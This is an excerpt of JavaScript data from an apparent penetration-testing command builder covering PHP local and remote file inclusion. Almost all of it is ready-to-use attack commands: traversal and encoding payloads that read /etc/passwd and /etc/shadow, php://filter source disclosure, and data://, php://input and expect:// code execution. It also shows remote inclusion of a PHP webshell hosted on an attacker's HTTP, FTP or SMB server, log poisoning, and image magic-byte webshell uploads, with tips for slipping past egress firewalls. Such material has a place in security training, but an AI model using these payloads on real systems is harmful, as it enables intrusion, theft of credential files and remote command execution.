...
const VARIABLES = {
  ...
  /* ── LFI / File Inclusion variables ─────────────────────────────────────── */
  '$$LFI_PAGE': {
    name: '$$LFI_PAGE',
    description: 'Vulnerable PHP page filename (e.g. index.php, view.php)',
    howToGet: [
      { method: 'Browser address bar', notes: 'The PHP script in the URL path, e.g. http://target/index.php' },
      { method: 'Directory brute-force', command: 'ffuf -w $$WORDLIST -u $$URL/FUZZ.php -mc 200', notes: 'Find all PHP files on the target.' },
    ],
  },
  '$$LFI_PARAM': {
    name: '$$LFI_PARAM',
    description: 'Vulnerable file inclusion parameter name (e.g. language, page, file, path)',
    howToGet: [
      { method: 'Fuzz parameter names', command: 'ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u "$$URL/$$LFI_PAGE?FUZZ=value" -fs <BASELINE>', notes: 'Baseline: curl -s "$$URL/$$LFI_PAGE" | wc -c. Top LFI params to try manually: language, page, file, path, dir, module, template, view, doc, include' },
    ],
  },
  '$$TRAVERSAL': {
    name: '$$TRAVERSAL',
    description: 'Path traversal prefix including trailing slash (e.g. ../../../../)',
    howToGet: [
      { method: 'Test incrementally', notes: 'Add ../ levels until /etc/passwd is readable. /var/www/html = 3 directories deep = 4 levels of ../.' },
      { method: 'Fuzz depth', command: 'ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u "$$URL/$$LFI_PAGE?$$LFI_PARAM=FUZZ" -fs <BASELINE>', notes: 'A matching payload reveals the correct depth. Baseline: curl -s "$$URL/$$LFI_PAGE?$$LFI_PARAM=test" | wc -c' },
    ],
  },
  '$$SHELL_NAME': {
    name: '$$SHELL_NAME',
    description: 'Webshell or malicious upload filename (e.g. shell.php, shell.gif, shell.jpg)',
    howToGet: [
      { method: 'Choose freely', notes: 'Adjust extension per technique: .php for RFI, .gif for GIF magic bytes upload, .jpg for zip/phar uploads.' },
    ],
  },
  '$$PHP_VERSION': {
    name: '$$PHP_VERSION',
    description: 'PHP version on the server (e.g. 7.4, 8.1) — used to construct php.ini paths',
    howToGet: [
      { method: 'Response headers', command: 'curl -I $$URL | grep -i X-Powered-By', notes: 'X-Powered-By: PHP/7.4.x reveals the version directly.' },
      { method: 'Try common versions', notes: 'Read /etc/php/<version>/apache2/php.ini via LFI. Try: 8.2, 8.1, 8.0, 7.4, 7.3 in order (newest first).' },
    ],
  },
  '$$WEBROOT': {
    name: '$$WEBROOT',
    description: 'Web server document root absolute path with trailing slash (e.g. /var/www/html/)',
    howToGet: [
      { method: 'Fuzz webroot', command: 'ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u "$$URL/$$LFI_PAGE?$$LFI_PARAM=../../../../FUZZ/index.php" -fs <BASELINE>', notes: 'A response with different size reveals the webroot path.' },
      { method: 'Read server config', command: 'curl -s "$$URL/$$LFI_PAGE?$$LFI_PARAM=$$TRAVERSALetc/apache2/sites-enabled/000-default.conf"', notes: 'DocumentRoot directive shows the webroot.' },
      { method: 'Common defaults', notes: 'Apache: /var/www/html/ — Nginx: /usr/share/nginx/html/ — XAMPP: C:\\xampp\\htdocs\\' },
    ],
  },
  '$$UPLOAD_PATH': {
    name: '$$UPLOAD_PATH',
    description: 'Upload directory path relative to webroot, with surrounding slashes (e.g. $$UPLOAD_PATH)',
    howToGet: [
      { method: 'Inspect upload response', notes: 'After uploading a file, check the HTML source or response for the src/href path to the uploaded file.' },
      { method: 'Fuzz common upload dirs', command: 'ffuf -w /opt/useful/seclists/Discovery/Web-Content/raft-medium-directories.txt:FUZZ -u $$URL/FUZZ/ -mc 200,301,403', notes: 'Common paths: /uploads/ /images/ $$UPLOAD_PATH /avatars/ /files/ /media/' },
    ],
  },
  '$$LOG_PATH': {
    name: '$$LOG_PATH',
    description: 'Absolute path to server log file for log poisoning (e.g. $$LOG_PATH)',
    howToGet: [
      { method: 'Test common paths via LFI', command: 'curl -s "$$URL/$$LFI_PAGE?$$LFI_PARAM=$$TRAVERSALvar/log/apache2/access.log"', notes: 'Apache: $$LOG_PATH — Nginx: /var/log/nginx/access.log — Auth: /var/log/auth.log' },
      { method: 'Read apache2.conf', command: 'curl -s "$$URL/$$LFI_PAGE?$$LFI_PARAM=$$TRAVERSALetc/apache2/apache2.conf" | grep -i log', notes: 'APACHE_LOG_DIR in apache2.conf — read /etc/apache2/envvars to resolve the variable.' },
    ],
  },
  '$$SESSION_ID': {
    name: '$$SESSION_ID',
    description: 'PHP session ID value (PHPSESSID cookie) for session poisoning attacks',
    howToGet: [
      { method: 'Browser DevTools', notes: 'Application tab → Cookies → copy the PHPSESSID value.' },
      { method: 'curl verbose', command: 'curl -s $$URL/ -v 2>&1 | grep -i "set-cookie.*PHPSESSID"', notes: 'Extracts PHPSESSID from the Set-Cookie response header.' },
    ],
  },
...
const VAR_GROUPS = [
  ...
  { name: 'LFI',            vars: ['$$LFI_PAGE', '$$LFI_PARAM', '$$TRAVERSAL', '$$SHELL_NAME', '$$PHP_VERSION', '$$WEBROOT', '$$UPLOAD_PATH', '$$LOG_PATH', '$$SESSION_ID'] },
];
        ...
        theory: {
          ...
          phases: [
            ...
            },
            {
              ...
              items: [
                'Basic traversal: $$TRAVERSALetc/passwd',
                'If prefix is enforced: ./languages/$$TRAVERSALetc/passwd',
          ...
          concepts: [
            ...
            },
            {
              ...
              flow: ['Identify readable log (access.log, auth.log, vsftpd.log, mail, session)', 'Poison field with PHP webshell (curl -A or ssh with PHP username)', 'Include log via LFI: ?language=$$LOG_PATH', 'Pass &cmd=id to execute — repeat poison before each new command if session-based'],
            },
            {
              ...
              items: ['Basic: $$TRAVERSALetc/passwd', 'Double traverse: ....//....//etc/passwd (filter removes ../ leaving ../)', 'URL encode: %2e%2e%2f%2e%2e%2fetc%2fpasswd', 'Double URL encode: %252e%252e%252f (server decodes twice)', 'Path truncation (obsolete PHP<5.3): 2048+ chars + .ext overflows buffer', 'Null byte (obsolete PHP<5.4): /etc/passwd%00 strips appended extension'],
            },
            {
        ...
        subtechniques: [
          {
            ...
            commands: [
              { id: 'lfi-r2', label: 'Confirm LFI — absolute path (direct include)', os: 'Both', command: '$$URL/$$LFI_PAGE?$$LFI_PARAM=/etc/passwd\n$$URL/$$LFI_PAGE?$$LFI_PARAM=C:\\Windows\\win.ini', notes: 'If include() uses the raw parameter value (include($_GET["language"])) the absolute path works directly. Linux: /etc/passwd. Windows: C:\\Windows\\win.ini or C:\\Windows\\boot.ini' },
              { id: 'lfi1', label: 'Path traversal (relative)', os: 'Both', command: '$$URL/$$LFI_PAGE?$$LFI_PARAM=$$TRAVERSALetc/passwd\n$$URL/$$LFI_PAGE?$$LFI_PARAM=$$TRAVERSALetc/shadow\n$$URL/$$LFI_PAGE?$$LFI_PARAM=../../../../Windows/win.ini', notes: 'Use when include prepends a directory (e.g. include("./langs/" . $lang)). Start with 4 levels — add more if it fails. Overrunning to / is safe: extra ../ at root stays at root.' },
              { id: 'lfi-r3', label: 'Find correct traversal depth', os: 'Linux', command: '# Web root is commonly /var/www/html/ (3 dirs from /)\n../../../etc/passwd        # 3 levels\n$$TRAVERSALetc/passwd     # 4 levels\n../$$TRAVERSALetc/passwd  # 5 levels\n# Add ../ until you get output — more than needed is fine.', notes: 'Each directory in the web root path needs one level of ../. /var/www/html = 3 levels minimum.' },
              ...
              { id: 'lfi-r4', label: 'Read current PHP source via traversal', os: 'Both', command: '$$URL/$$LFI_PAGE?$$LFI_PARAM=$$TRAVERSALvar/www/html/index\n$$URL/$$LFI_PAGE?$$LFI_PARAM=php://filter/convert.base64-encode/resource=$$TRAVERSALvar/www/html/index', notes: 'Read the current file to understand include logic and find more parameters. Use base64 wrapper if direct include executes the PHP instead of showing source.' },
            ],
          },
          {
            id: 'lfi-st-bypass',
            name: 'Basic Bypasses',
            commands: [
              { id: 'lfi-b4', label: 'Non-recursive filter bypass (....//)', os: 'Both', command: '# Filter: str_replace("../", "", $input) — removes ../ once, not recursively\n# Use ....// → after ../ is stripped, becomes ../\n$$URL/$$LFI_PAGE?$$LFI_PARAM=....//....//....//....//etc/passwd\n# Variants:\n$$URL/$$LFI_PAGE?$$LFI_PARAM=..././..././..././..././etc/passwd\n$$URL/$$LFI_PAGE?$$LFI_PARAM=....\\....\\....\\....\\etc/passwd', notes: 'Works when filter does a single non-recursive str_replace of ../. The outer dots rebuild the ../ after the inner ../ is stripped. Also try ..././ and ..../\\' },
              { id: 'lfi-b2', label: 'URL encoding bypass', os: 'Both', command: '# Single encode: ../  →  %2e%2e%2f (encode dots too, not just slashes)\n$$URL/$$LFI_PAGE?$$LFI_PARAM=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64\n# Double encode: ../  →  %252e%252e%252f\n$$URL/$$LFI_PAGE?$$LFI_PARAM=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd', notes: 'Single encode bypasses filters that block . and / chars. Double encode bypasses single-decode WAFs: server decodes %25→%, then %2e→. and %2f→/. Must encode dots AND slashes.' },
              { id: 'lfi-b8', label: 'Approved path bypass', os: 'Both', command: '# When app enforces a path prefix via regex:\n# preg_match("/^\\.\\\/languages\\/.+$/", $input)\n# Satisfy the regex first, then traverse out:\n$$URL/$$LFI_PAGE?$$LFI_PARAM=./languages/$$TRAVERSALetc/passwd\n# Combine with encoding if a second filter also applies:\n$$URL/$$LFI_PAGE?$$LFI_PARAM=./languages/..%2f..%2f..%2f..%2fetc%2fpasswd', notes: 'If the app only allows paths starting with ./languages/, prepend it to satisfy the regex then break out with ../. Fuzz sub-paths under the approved prefix to find the right one.' },
          ...
          },
          {
            ...
            commands: [
              ...
              { id: 'lfi2', label: 'PHP filter — base64 source disclosure', os: 'Both', command: '# Syntax: php://filter/read=<filter>/resource=<file>\n# Omit .php — the app appends the extension automatically\n$$URL/$$LFI_PAGE?$$LFI_PARAM=php://filter/read=convert.base64-encode/resource=index\n$$URL/$$LFI_PAGE?$$LFI_PARAM=php://filter/read=convert.base64-encode/resource=config\n# Shorthand (without read=) also works:\n$$URL/$$LFI_PAGE?$$LFI_PARAM=php://filter/convert.base64-encode/resource=index', notes: 'Returns base64-encoded PHP source instead of executing it — bypasses PHP execution. Works with appended extensions too (omit .php in resource). View page source to copy the full base64 string without truncation.' },
        ...
        subtechniques: [
          {
            ...
            name: 'PHP Wrappers',
            commands: [
              { id: 'lfi-pw0', label: 'Check allow_url_include (php.ini)', os: 'Linux', command: '# Apache:\ncurl "$$URL/$$LFI_PAGE?$$LFI_PARAM=php://filter/read=convert.base64-encode/resource=$$TRAVERSALetc/php/$$PHP_VERSION/apache2/php.ini"\n# Nginx:\ncurl "$$URL/$$LFI_PAGE?$$LFI_PARAM=php://filter/read=convert.base64-encode/resource=$$TRAVERSALetc/php/$$PHP_VERSION/fpm/php.ini"\n# Decode and check:\necho \'B64_OUTPUT\' | base64 -d | grep allow_url_include\necho \'B64_OUTPUT\' | base64 -d | grep expect', notes: 'Required before using data://, php://input, or RFI attacks. Path: /etc/php/X.Y/apache2/php.ini (Apache) or /etc/php/X.Y/fpm/php.ini (Nginx). Try the latest PHP version first, then older ones.' },
              { id: 'lfi-b5', label: 'data:// wrapper (RCE)', os: 'Linux', command: '# Step 1: Base64 encode a PHP webshell:\necho \'<?php system($_GET["cmd"]); ?>\' | base64\n# Output: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==\n\n# Step 2: Inject — URL-encode + as %2B and = as %3D:\n$$URL/$$LFI_PAGE?$$LFI_PARAM=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id\n\n# Via curl:\ncurl -s \'$$URL/$$LFI_PAGE?$$LFI_PARAM=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id\' | grep uid\n\n# Plaintext variant (no encoding needed):\n$$URL/$$LFI_PAGE?$$LFI_PARAM=data://text/plain,<?php system("id"); ?>', notes: 'Requires allow_url_include=On. Base64 avoids special char issues in URLs. Not enabled by default — verify with php.ini read first.' },
              { id: 'lfi3', label: 'php://input (RCE via POST)', os: 'Linux', command: '# Send PHP webshell as POST body, run command via GET:\ncurl -s -X POST --data \'<?php system($_GET["cmd"]); ?>\' "$$URL/$$LFI_PAGE?$$LFI_PARAM=php://input&cmd=id" | grep uid\n\n# If function only accepts POST (no GET cmd param), embed command directly:\ncurl -s -X POST --data \'<?php system("id"); ?>\' "$$URL/$$LFI_PAGE?$$LFI_PARAM=php://input"', notes: 'Requires allow_url_include=On. Code is in the POST body — useful when GET is filtered. The vulnerable param must accept POST requests. If only POST is accepted use $_REQUEST or hardcode the command.' },
              { id: 'lfi-pw3', label: 'expect:// wrapper (RCE)', os: 'Linux', command: '# Check if expect extension is loaded (after reading php.ini via filter):\necho \'B64_PHP_INI\' | base64 -d | grep expect\n# "extension=expect" confirms it is configured\n\n# Execute commands directly — no webshell needed:\ncurl -s "$$URL/$$LFI_PAGE?$$LFI_PARAM=expect://id" | grep uid\ncurl -s "$$URL/$$LFI_PAGE?$$LFI_PARAM=expect://whoami"', notes: 'External wrapper — must be manually installed and enabled. Rarely found but simplest RCE: commands run directly without a webshell. Verify via php.ini before trying.' },
            ],
          },
          {
            id: 'lfi-st-rfi',
            ...
            commands: [
              { id: 'lfi-rfi0', label: 'Verify RFI', os: 'Linux', command: '# Check allow_url_include (decode php.ini via filter first):\necho \'B64_PHP_INI\' | base64 -d | grep allow_url_include\n# allow_url_include = On confirms potential RFI\n\n# Confirm by including a local URL (safe, no external connection needed):\n$$URL/$$LFI_PAGE?$$LFI_PARAM=http://127.0.0.1:80/index.php\n\n# Also probe internal services by changing the port (SSRF):\n$$URL/$$LFI_PAGE?$$LFI_PARAM=http://127.0.0.1:8080/index.php', notes: 'Even if allow_url_include=On, the function may still reject remote URLs — always test with a local URL first. If 127.0.0.1 works, RFI is confirmed. Avoid including index.php on itself (recursion); use a different page if available.' },
              { id: 'lfi-rfi1', label: 'RFI via HTTP', os: 'Linux', command: '# Step 1: Create the webshell:\necho \'<?php system($_GET["cmd"]); ?>\' > $$SHELL_NAME\n\n# Step 2: Host it (use 443/80 to bypass egress firewalls):\nsudo python3 -m http.server $$LPORT\n\n# Step 3: Include and execute:\ncurl -s "$$URL/$$LFI_PAGE?$$LFI_PARAM=http://$$LHOST:$$LPORT/$$SHELL_NAME&cmd=id"\n\n# Or directly in the browser:\n$$URL/$$LFI_PAGE?$$LFI_PARAM=http://$$LHOST:$$LPORT/$$SHELL_NAME&cmd=id', notes: 'Requires allow_url_include=On. Watch your HTTP server for GET /$$SHELL_NAME to confirm the file was fetched. Use port 443 or 80 to blend with normal traffic and avoid outbound firewall blocks.' },
              { id: 'lfi-rfi2', label: 'RFI via FTP', os: 'Linux', command: '# Step 1: Create the webshell:\necho \'<?php system($_GET["cmd"]); ?>\' > $$SHELL_NAME\n\n# Step 2: Start FTP server (anonymous auth by default):\nsudo python -m pyftpdlib -p 21\n\n# Step 3: Include via ftp:// URL:\ncurl -s "$$URL/$$LFI_PAGE?$$LFI_PARAM=ftp://$$LHOST/$$SHELL_NAME&cmd=id"\n\n# If credentials are required by the server:\ncurl -s "$$URL/$$LFI_PAGE?$$LFI_PARAM=ftp://user:pass@$$LHOST/$$SHELL_NAME&cmd=id"', notes: 'Useful when http:// strings are blocked by a WAF or firewall rule. Requires allow_url_include=On. Install pyftpdlib with: pip install pyftpdlib.' },
              { id: 'lfi-rfi3', label: 'RFI via SMB (Windows)', os: 'Windows', command: '# Step 1: Create the webshell:\necho \'<?php system($_GET["cmd"]); ?>\' > $$SHELL_NAME\n\n# Step 2: Spin up an SMB share (anonymous auth, SMB2 support):\nimpacket-smbserver -smb2support share $(pwd)\n\n# Step 3: Include via UNC path:\ncurl -s "$$URL/$$LFI_PAGE?$$LFI_PARAM=\\\\\\\\$$LHOST\\\\share\\\\$$SHELL_NAME&cmd=whoami"\n\n# In browser (UNC path):\n$$URL/$$LFI_PAGE?$$LFI_PARAM=\\\\$$LHOST\\share\\$$SHELL_NAME&cmd=whoami', notes: 'Windows targets only. Does NOT require allow_url_include=On — Windows natively resolves UNC paths. Works best when attacker is on the same network. The -smb2support flag prevents connection issues with modern Windows versions.' },
            ],
          },
          {
            id: 'lfi-st-upload',
  ...
  },
  {
    ...
    techniques: [
      ...
      },
      {
        ...
        commands: [
          { id: 'upl3', label: 'Magic bytes bypass', os: 'Linux', command: "echo -e 'GIF89a\\n<?php system($_GET[\"cmd\"]); ?>' > $$SHELL_NAME.gif\nexiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg -o shell.php.jpg", notes: 'GIF89a passes image MIME check. exiftool injects PHP into image metadata.' },
          { id: 'upl-m1', label: 'JPEG magic bytes prepend', os: 'Linux', command: "printf '\\xFF\\xD8\\xFF<?php system($_GET[\"cmd\"]); ?>' > $$SHELL_NAME", notes: 'JPEG magic: FF D8 FF. Server checks magic bytes; rest is PHP.' },
